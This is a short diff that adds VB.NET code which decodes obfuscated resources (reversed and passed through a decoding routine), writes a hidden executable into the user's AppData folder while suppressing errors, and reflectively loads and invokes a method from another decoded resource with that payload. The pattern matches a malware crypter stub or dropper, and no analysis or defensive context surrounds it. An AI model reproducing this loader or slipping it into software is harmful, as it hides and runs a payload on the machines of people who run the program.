@@ -1,0 +1,10 @@
+ Dim N As String = System.Text.Encoding.Default.GetString(AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM")))))
+ Dim I As String = Environ("APPDATA") & "\" & N & ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I")))), False)
+ Catch
+ End Try
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object() {AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("F")))), I})
